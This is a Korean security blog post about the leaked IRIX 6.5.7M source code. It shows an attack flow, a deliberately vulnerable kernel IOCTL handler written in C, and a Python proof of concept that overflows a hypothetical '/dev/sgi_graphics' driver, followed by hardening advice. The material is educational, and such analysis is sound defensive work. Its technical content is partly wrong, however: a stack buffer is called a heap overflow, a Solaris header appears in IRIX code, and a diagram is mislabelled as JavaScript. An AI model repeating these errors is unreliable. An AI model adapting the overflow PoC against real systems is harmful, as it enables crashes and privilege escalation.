---
title: "🔍 IRIX 6.5.7M Source Code: SGI 레거시 유닉스 보안 분석"
date: 2026-03-15T20:53:19+09:00
draft: false
tags:
  - "IRIX"
  - "SGI"
  - "Unix"
  - "Source Code"
  - "Legacy Security"
categories:
  - "보안"
---


## 서론

1990년대 후반에서 2000년대 초반, 고성능 그래픽 워크스테이션의 제왕으로 군림했던 실리콘 그래픽스(SGI)의 IRIX. 최근 GitHub에 IRIX 6.5.7M 버전의 소스 코드가 유출되면서 보안 커뮤니티가 들썩이고 있습니다. 현대의 해커에게 왜 20년이 넘은 유닉스 운영체제가 중요할까요?
바로 "레거시 시스템의 저주" 때문입니다. 여러분이 상상하는 것보다 훨씬 더 많은 핵심 인프라(발전소, 공장 자동화, 의료 영상 장비)가 여전히 패치되지 않은, 혹은 패치가 불가능한 구형 유닉스 시스템 위에서 돌아가고 있습니다. 이 시스템들은 보통 인터넷과 직접 연결되지 않아 안전하다고 여겨지지만, 공급망 해킹이나 내부망 침투 시에는 가장 취약한 고리가 됩니다.
이번 소스 코드 유출은 단순한 호기심을 넘어, **"화이트 박스(White-box) 취약점 분석"**을 통해 공격자가 이미 알고 있을지도 모르는 0-day 취약점을 방어자가 먼저 찾아낼 수 있는 절호의 기회입니다. 이 글에서는 공개된 소스 코드를 활용해 IRIX 시스템의 보안 메커니즘을 분석하고, 실제로 악용될 수 있는 시나리오와 이에 대한 방어 전략을 다룹니다.

## 본론


### IRIX 보안 아키텍처와 공격 표면 분석

IRIX는 System V 기반의 유닉스 계열이지만, SGI만의 고유한 그래픽 서브시스템과 파일 시스템(XFS)을 통합하고 있습니다. 소스 코드 분석 결과, 당대의 보안 기술 수준에 비추어 볼 때 현대적인 공격 기법에 매우 취약한 구조적 특징들이 다수 발견됩니다.
특히 주목해야 할 부분은 **커널 모드 드라이버와 사용자 공간 간의 상호작용(IOCTL)**입니다. 당시에는 보안보다는 성능 최적화가 우선시되었기 때문, 사용자가 전달하는 입력값에 대한 검증(Validation)이 충분하지 않은 경우가 많습니다.
아래는 외부 공격자가 IRIX 시스템의 취약점을 이용해 권한을 상승시키는 일반적인 공격 흐름도입니다.

```javascript
graph LR
    A[External Attacker] --> B[Initial Access]
    B --> C[User Shell Access]
    C --> D[Vulnerable Binary Analysis]
    D --> E[IOCTL System Call]
    E --> F[Kernel Driver]
    F --> G[Missing Boundary Check]
    G --> H[Buffer Overflow]
    H --> I[Kernel Code Execution]
    I --> J[Root Privilege]
```


### 주요 취약점 시나리오: IOCTL 핸들러의 버퍼 오버플로우

⚠️ **윤리적 경고**: 아래 내용은 보안 취약점의 원리를 이해하고 방어 대책을 마련하기 위한 학습 목적으로 작성되었습니다. 승인되지 않은 시스템에 대한 테스트는 불법이며 처벌받을 수 있습니다.
소스 코드를 리뷰하던 중, 가상의 그래픽 드라이버 `/dev/sgi_graphics` 내의 IOCTL 핸들러에서 `copyin()` 함수를 사용할 때 버퍼 크기 검증이 누락된 전형적인 힙 기반 오버플로우(Heap Overflow) 패턴을 발견했다고 가정해 봅시다.
#### 취약 코드 예시 (C)
IRIX 커널 드라이버 내부의 취약한 코드 구조는 대략 다음과 같습니다.

```c
#include <sys/ddi.h>
#include <sys/sunddi.h>

#define GRAPHICS_SET_PARAM 0x1234

/* 취약한 커널 드라이버 코드 시뮬레이션 */
int graphics_ioctl(dev_t dev, int cmd, void *arg, int mode, cred_t *cred_p, int *rval_p) {
    char kernel_buffer[128];
    
    if (cmd == GRAPHICS_SET_PARAM) {
        /* 취약점: arg에서 오는 데이터의 크기를 검증하지 않고 1024바이트를 복사 시도 */
        /* 만약 사용자가 128바이트 이상의 데이터를 보내면 힙 오버플로우 발생 */
        copyin(arg, kernel_buffer, 1024); 
        
        /* ... 정상 처리 로직 ... */
        return 0;
    }
    return EINVAL;
}
```

이 코드에서 `copyin` 함수는 사용자 공간(`arg`)에서 커널 공간(`kernel_buffer`)으로 데이터를 복사합니다. 그러나 `kernel_buffer`는 128바이트인 반면, `copyin`은 1024바이트를 복사하려 시도합니다. 이로 인해 힙 메타데이터를 덮어쓰거나 인접한 중요한 커널 객체를 오염시킬 수 있습니다.
#### 공격자의 PoC (Proof of Concept) 코드
공격자는 이 취약점을 이용해 악의적인 코드를 실행하거나 시스템을 크래시시킬 수 있습니다.

```python
#!/usr/bin/env python3
import struct
import fcntl
import os

# 디바이스 파일 경어 (IRIX 시스템에 따라 다름)
DEVICE_PATH = "/dev/sgi_graphics"
IOCTL_CMD = 0x1234

def exploit_attempt():
    try:
        # 디바이스 파일 열기
        fd = os.open(DEVICE_PATH, os.O_RDWR)
        
        # 악의적인 페이로드 생성
        # 버퍼 크기(128)를 초과하는 Junk 데이터 + 의도적인 Return Address 등
        padding = b"A" * 128
        overflow_data = b"B" * (1024 - 128) # 임의의 데이터로 나머지 버퍼 채움
        
        payload = padding + overflow_data
        
        print(f"[+] Sending payload of size: {len(payload)} bytes...")
        
        # IOCTL 호출 시도
        fcntl.ioctl(fd, IOCTL_CMD, payload)
        
        print("[+] Payload sent. Check system status.")
        os.close(fd)
        
    except PermissionError:
        print("[-] Error: Root privileges required.")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    print("IRIX Kernel Driver PoC - Educational Purpose Only")
    exploit_attempt()
```


### 화이트 박스 vs 블랙 박스 분석 비교

소스 코드가 공개됨으로써 얻을 수 있는 이점은 명확합니다. 블랙 박스 테스트(실행 파일만 보고 분석)와 비교했을 때, 화이트 박스 분석의 효율성은 압도적입니다.
| 비교 항목 | 블랙 박스 테스트 (Binary Only) | 화이트 박스 분석 (Source Code Available) | | :--- | :--- | :--- | | 접근성 | 디컴파일/디버깅 난이도 높음 | 코드 직접 열람 가능, grep 등의 도구 사용 | | 취약점 탐지 속도 | 느림 (Fuzzing 등에 의존) | 빠름 (정적 분석으로 로직 파악 용이) | | 원리 파악 | 어셈블리 수준의 추측 필요 | 개발자의 의도와 주석까지 확인 가능 | | 로직 오류 발견 | 어려움 | 상대적으로 쉬움 (if/else 분기 등 확인) | | 진입점 식별 | Import Table 분석 필요 | 함수 호출 그래프 즉시 확인 |

### 레거시 시스템 보안 강화 가이드

IRIX와 같은 레거시 유닉스 시스템은 더 이상 공식 패치가 나오지 않습니다(Patch Tuesday가 없습니다). 따라서 환경적 제약(Control)과 네트워크 보안(Network)으로 방어해야 합니다.
**Step-by-Step 방어 전략:**
1.  **격리 (Isolation)**:     *   IRIX 시스템을 외부 인터넷과 완전히 분리된 물리적 네트워크에 배치합니다.     *   관리자만 접근할 수 있는 별도의 관리망(Admin VLAN)을 구성합니다.
2.  **제한 (Restriction)**:     *   `inetd.conf`나 `/etc/hosts.allow`, `/etc/hosts.deny`를 사용하여 특정 IP에서만 접근을 허용합니다.     *   불필요한 서비스(프린터 서비스, r-commands 등)는 모두 비활성화합니다.
3.  **모니터링 (Monitoring)**:     *   시스템 호출 감사(audit)를 활성화하여 의심스러운 `root` 권한 획득 시도나 `execve` 호출을 기록합니다.     *   네트워크 트래픽을 모니터링하여 비정상적인 아웃바운드 연결을 차단합니다.
4.  **데이터 무결성 (Integrity)**:     *   AIDE(Advanced Intrusion Detection Environment)와 같은 도구를 사용하여 주요 시스템 바이너리의 해시값을 주기적으로 검증합니다.

## 결론

IRIX 6.5.7M 소스 코드의 공개는 보안 연구자들에게 "타임머신"을 타고 과거로 돌아가는 듯한 경험을 제공합니다. 당시의 개발자들이 보안보다는 성능과 기능 구현에 집중했던 선택이 현대의 관점에서는 어떻게 치명적인 보안 허점으로 이어지는지 생생하게 보여주기 때문입니다.
이번 사건을 통해 얻는 핵심 인사이트는 **"보안은 시간이 지난다고 해결되지 않는다"**는 것입니다. 레거시 시스템은 잊혀지는 것이 아니라, 공격자의 지하 감옥(Dungeon)에서 계속해서 숨 쉬고 있습니다. 소스 코드 분석을 통해 발견된 취약점들은 IRIX뿐만 아니라, 유사한 로직을 사용하는 다른 임베디드 리눅스나 유닉스 계열 OS에도 적용될 수 있습니다.
현장 보안 전문가로서, 이러한 레거시 자산을 관리해야 한다면 "보안 패치"를 기대하기보다 "심층 방어(Defense in Depth)" 전략을 통해 시스템을 감옥 안에 가두는 것이 유일한 해법임을 명심해야 합니다.

## 참고자료

- [IRIX 6.5.7M Source Code (GitHub)](https://github.com/calmsacibis995/irix-657m-src)
- [HackerNews Discussion](https://news.ycombinator.com/item?id=47262402)
- [SGI IRIX Security History](https://www.cvedetails.com/vendor/83/SGI.html)
